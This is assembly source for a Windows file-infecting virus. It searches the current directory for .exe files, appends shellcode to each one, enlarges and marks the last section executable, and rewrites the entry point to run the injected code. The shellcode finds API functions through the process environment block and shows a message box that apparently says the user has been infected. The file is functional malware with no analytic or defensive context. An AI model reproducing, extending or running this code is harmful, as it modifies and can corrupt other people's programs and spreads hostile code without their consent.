.386
.model flat,stdcall
option casemap:none
assume fs:nothing

include \masm32\include\masm32rt.inc
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib
includelib \masm32\lib\masm32.lib

;==============================================================================
bin$ MACRO DDvalue
    IFNDEF _rv_bin_string_
        .data
            _rv_bin_string_ db 36 dup(0)
        .code
    ENDIF
    invoke crt__itoa, DDvalue, ADDR _rv_bin_string_, 2
    EXITM <ADDR _rv_bin_string_>
ENDM
;==============================================================================

.data
    nul         dd 0
    shellcode   db 031h, 0C9h, 064h, 08Bh, 041h, 030h, 08Bh, 040h, 00Ch, 08Bh, 070h, 014h, 0ADh
                db 096h, 0ADh, 08Bh, 058h, 010h, 08Bh, 053h, 03Ch, 001h, 0DAh, 08Bh, 052h, 078h
                db 001h, 0DAh, 08Bh, 072h, 020h, 001h, 0DEh, 031h, 0C9h, 08Bh, 053h, 03Ch, 001h
                db 0DAh, 08Bh, 052h, 078h, 001h, 0DAh, 08Bh, 072h, 020h, 001h, 0DEh, 031h, 0C9h
                db 041h, 0ADh, 001h, 0D8h, 081h, 038h, 047h, 065h, 074h, 050h, 075h, 0F4h, 081h
                db 078h, 004h, 072h, 06Fh, 063h, 041h, 075h, 0EBh, 081h, 078h, 008h, 064h, 064h
                db 072h, 065h, 075h, 0E2h, 08Bh, 072h, 024h, 001h, 0DEh, 066h, 08Bh, 00Ch, 04Eh
                db 049h, 08Bh, 072h, 01Ch, 001h, 0DEh, 08Bh, 014h, 08Eh, 001h, 0DAh, 031h, 0C9h
                db 053h, 052h, 051h, 068h, 061h, 072h, 079h, 041h, 068h, 04Ch, 069h, 062h, 072h
                db 068h, 04Ch, 06Fh, 061h, 064h, 054h, 053h, 0FFh, 0D2h, 083h, 0C4h, 00Ch, 059h
                db 050h, 051h, 066h, 0B9h, 06Ch, 06Ch, 051h, 068h, 033h, 032h, 02Eh, 064h, 068h
                db 075h, 073h, 065h, 072h, 054h, 0FFh, 0D0h, 083h, 0C4h, 010h, 08Bh, 054h, 024h
                db 004h, 031h, 0C9h, 051h, 0B9h, 06Fh, 078h, 041h, 061h, 051h, 083h, 06Ch, 024h
                db 003h, 061h, 068h, 061h, 067h, 065h, 042h, 068h, 04Dh, 065h, 073h, 073h, 054h
                db 050h, 0FFh, 0D2h, 083h, 0C4h, 014h, 031h, 0C9h, 051h, 0B9h, 074h, 065h, 064h
                db 061h, 051h, 083h, 06Ch, 024h, 003h, 061h, 068h, 06Eh, 066h, 065h, 063h, 068h
                db 06Fh, 074h, 020h, 069h, 068h, 076h, 065h, 020h, 067h, 068h, 059h, 06Fh, 075h
                db 027h, 089h, 0E3h, 031h, 0C9h, 051h, 068h, 075h, 073h, 054h, 051h, 068h, 072h
                db 065h, 06Bh, 063h, 089h, 0E1h, 031h, 0D2h, 052h, 051h, 053h, 031h, 0FFh, 057h
                db 0FFh, 0D0h, 068h
    retAddr     db 0C3h
    ofs         dd 0
    oep         dd 0
    ffd             WIN32_FIND_DATA <>
    CurrentPath     db MAX_PATH dup(0)
    exeExtension    db MAX_PATH dup(0)
    exePath         db MAX_PATH dup(0)
    FileName        dw MAX_PATH dup(0)
    hFind           HANDLE INVALID_HANDLE_VALUE
    hFile           HANDLE INVALID_HANDLE_VALUE
    hMap            HANDLE INVALID_HANDLE_VALUE
    lpBase          LPVOID 0
    emagic      dw 0
    elfanew     dd 0
    peSig       dd 0
    noSec       dd 0
    secSz       dd 0
    szOpHdr     dw 0
    endFile     dd 0
    chrctrstc   dd 0
    aoep        dd 0
    rawSize     dd 0
    endRVA      dd 0

.code
start:
    call main
    invoke ExitProcess,NULL

ofsToRVA PROTO :DWORD
ofsToRVA PROC offs:DWORD
    mov ebx, offs
    mov eax, lpBase
    add eax, elfanew
    add eax, 18h
    add ax, szOpHdr                                 ; SectionHeader -> eax
    mov ecx, noSec                                  ; NumberOfSections -> ecx
nxtSection:
    ; SectionHeader[i].PointerToRawData >= endRVA || endRVA > SectionHeader[i].PointerToRawData + SectionHeader[i].SizeOfRawData
    mov edx, DWORD ptr [eax+14h]                    ; PointerToRawData
    cmp ebx, edx
    jle continue
    add edx, DWORD ptr [eax+10h]                    ; + SizeOfRawData
    cmp ebx, edx
    jg continue
    mov edx, ebx
    sub edx, DWORD ptr [eax+14h]                    ; - PointerToRawData
    add edx, DWORD ptr [eax+0Ch]                    ; + VirtualAddress
    mov ebx, edx

continue:
    add eax, 28h
    dec ecx
    test ecx, ecx
    jnz nxtSection
    ret
ofsToRVA endp

main proc
    invoke GetCommandLine
    mov ecx, -1
fileName:
    inc ecx
    cmp byte ptr [eax+ecx], 34; "'"' character"
    je fileName
    cmp byte ptr [eax+ecx], 0
    je beginCode
    mov dl, byte ptr [eax+ecx]
    mov byte ptr [FileName+ecx-1], dl
    jmp fileName
beginCode:
    invoke GetCurrentDirectory, MAX_PATH, addr CurrentPath
    lea eax, [CurrentPath]
    lea edx, [exeExtension]
makeExePath:
    cmp byte ptr [eax], 0
    je addExe
    mov cl, byte ptr [eax]
    mov byte ptr [edx], cl
    inc edx
    inc eax
    jmp makeExePath
addExe:
    mov cl, 92
    mov byte ptr [edx], cl
    mov cl, 42
    mov byte ptr [edx+1], cl
    mov cl, 46
    mov byte ptr [edx+2], cl
    mov cl, 101
    mov byte ptr [edx+3], cl
    mov byte ptr [edx+3], cl
    mov cl, 120
    mov byte ptr [edx+4], cl
    mov cl, 101
    mov byte ptr [edx+5], cl
    xor cl, cl
    mov byte ptr [edx+6], cl

    invoke FindFirstFile, addr exeExtension, addr ffd
    mov hFind, eax
    cmp hFind, INVALID_HANDLE_VALUE
    je ext
    
infectFunc:
; open file
    invoke GetFullPathName, addr ffd.cFileName, MAX_PATH, addr exePath, NULL
    invoke lstrcmp, addr exePath, addr FileName
    cmp eax, 0
    je exeSearch
    invoke CreateFile, addr exePath, 0C0000000h, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    mov hFile, eax
    cmp eax, INVALID_HANDLE_VALUE                   ; create file handle
    je exeSearch
    
    invoke CreateFileMapping, hFile, 0, PAGE_READONLY, 0, 0, 0
    mov hMap, eax
    or eax, eax                                     ; map file handle
    jz ext
    
    invoke MapViewOfFile, hMap, FILE_MAP_READ, 0, 0, 0
    mov lpBase, eax
    or eax, eax                                     ; create map handle
    jz ext
    
    push WORD ptr [eax]                             ; e_magic
    pop emagic
    cmp emagic, 5A4Dh                               ; check PE file magic = "MZ"
    jne ext

    push DWORD ptr [eax+03Ch]                       ; e_lfanew
    pop elfanew
    add eax, elfanew
    push DWORD ptr [eax]                            ; Signature
    pop peSig
    cmp peSig, 4550h                                ; check PE signature = "PE"
    jne ext

; initialize pe header
    add eax, 004h
    push eax
    push WORD ptr [eax+2h]                          ; NumberOfSections
    xor eax, eax
    pop ax
    mov noSec, eax
    dec ax
    mov edx, 028h
    mul edx
    mov secSz, eax
    pop eax
    push WORD ptr [eax+10h]                         ; SizeOfOptionalHeader
    pop szOpHdr
    add eax, 014h
    mov edx, DWORD ptr [eax+10h]                    ; AddressOfEntryPoint
    add edx, DWORD ptr [eax+1Ch]                    ; ImageBase
    mov aoep, edx
    add ax, szOpHdr
    add eax, secSz
    mov ofs, eax
    mov edx, DWORD ptr [eax+10h]                    ; SizeOfRawData
    mov rawSize, edx
    add edx, DWORD ptr [eax+14h]                    ; PointerToRawData
    mov endFile, edx
    mov edx, DWORD ptr [eax+24h]                    ; Characteristics
    mov chrctrstc, edx

; 1. jump to end file and write opcode
    mov edx, lpBase
    sub ofs, edx
    invoke SetFilePointer, hFile, NULL, NULL, FILE_END
    invoke WriteFile, hFile, addr shellcode, 250, addr oep, NULL
    invoke WriteFile, hFile, addr aoep, 4, addr oep, NULL
    invoke WriteFile, hFile, addr retAddr, 1, addr oep, NULL

; 2. round up virtual size
    add ofs, 8h

; 3. add size of opcode to raw size
    add ofs, 8h
    add rawSize, 0FFh
    invoke SetFilePointer, hFile, ofs, NULL, FILE_BEGIN
    invoke WriteFile, hFile, addr rawSize, 4, addr oep, NULL
    
; 4. change section characteristic to execute
    add ofs, 14h
    or chrctrstc, 020000000h
    invoke SetFilePointer, hFile, ofs, NULL, FILE_BEGIN
    invoke WriteFile, hFile, addr chrctrstc, 4, addr oep, NULL

; 5. replace end file RVA to AddressOfEntryPoint
    push elfanew
    pop ofs
    add ofs, 28h
    push endFile
    pop endRVA
    push endRVA
    call ofsToRVA
    mov endRVA, ebx
    invoke SetFilePointer, hFile, ofs, NULL, FILE_BEGIN
    invoke WriteFile, hFile, addr endRVA, 4, addr oep, NULL

ext:
    invoke CloseHandle, hMap
exitF:
    invoke CloseHandle, hFile
exeSearch:
    invoke FindNextFile, hFind, addr ffd
    cmp eax, 0
    je endG
    jmp infectFunc
endG:
    invoke CloseHandle, hFind
    xor eax, eax
    ret
main endp
end start
